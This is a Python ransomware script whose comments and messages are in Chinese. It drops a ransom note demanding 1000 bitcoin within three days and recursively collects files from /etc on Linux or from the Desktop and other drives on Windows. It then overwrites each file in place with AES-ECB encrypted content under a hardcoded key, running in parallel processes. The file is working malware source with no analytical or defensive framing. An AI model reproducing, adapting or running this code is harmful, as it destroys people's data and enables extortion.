#author:九世
#time:2019/5/5

import gevent
from gevent import monkey;monkey.patch_all()
from Crypto.Cipher import AES
from multiprocessing import Process
import base64
import binascii
import platform
import os
import re

flst=[]
file=[]
class Jiami:
    def __init__(self,key):
        self.key=key

    def zhu(self):
        syst=platform.system()
        if syst=='Linux':
            dk=open('/root/demos/lesuo.txt','w',encoding='utf-8')
            dk.write('你的电脑已被加密，请在三天之内转1000比特币到制定账户\n请联系x_lovehaq666@check.com')
            dk.close()
            file.append('/etc')
        elif syst=='Windows':
            dk=open('C:/lesuo.txt','w',encoding='utf-8')
            dk.write('你的电脑已被加密，请在三天之内转1000比特币到制定账户\n请联系x_lovehaq666@check.com')
            dk.close()
            for k in range(65,91):
                path='{}:'.format(chr(k))
                if path=='C:':
                    zx=os.popen('whoami')
                    zz=re.findall(r'\\.*',zx.read())
                    ps='C:/Users/{}/Desktop'.format(str(zz[0]).replace('\\',''))
                    print(ps)
                    file.append(ps)
                elif os.path.exists(path):
                    file.append(path)

        for f in file:
            self.demo(f)

    def demo(self,path):
        global flst
        if os.path.exists(path):
            jg = os.listdir(path)
            for i in jg:
                fn = str(path) + '/' + str(i)
                if os.path.isfile(fn):
                    flst.append(fn)
                elif os.path.isdir(fn):
                    self.demo(fn)



    def encrypt(self,file):
        if 'lesuo.txt' in file:
            pass
        else:
            dk=open(file,'rb')
            text=dk.read()
            while len(text)%16!=0:
                text+=b'\0'
            else:
                text=text

            text=binascii.hexlify(text)
            aes=AES.new(self.key,AES.MODE_ECB)
            jg=str(base64.encodebytes(aes.encrypt(text)),encoding='utf-8').replace('\n','')
            xj=open(file,'wb')
            xj.write(jg.encode('utf-8'))
            xj.close()
            print('[^] 加密成功:{}'.format(file))

    def xc(self,rk):
        rwu=[]
        for s in rk:
            rwu.append(gevent.spawn(self.encrypt,s))
        gevent.joinall(rwu)

    def djc(self):
        calc=0
        dg=[]
        for u in flst:
            if calc==5000:
                p=Process(target=self.xc,args=(dg,))
                p.start()
                calc=0
                dg.clear()
            dg.append(u)
            calc+=1

        if len(dg)>0:
            p = Process(target=self.xc, args=(dg,))
            p.start()

if __name__ == '__main__':
    KEY='CE8D2AAC0CE1684C'.encode('utf-8')
    obj=Jiami(key=KEY)
    obj.zhu()
    obj.djc()
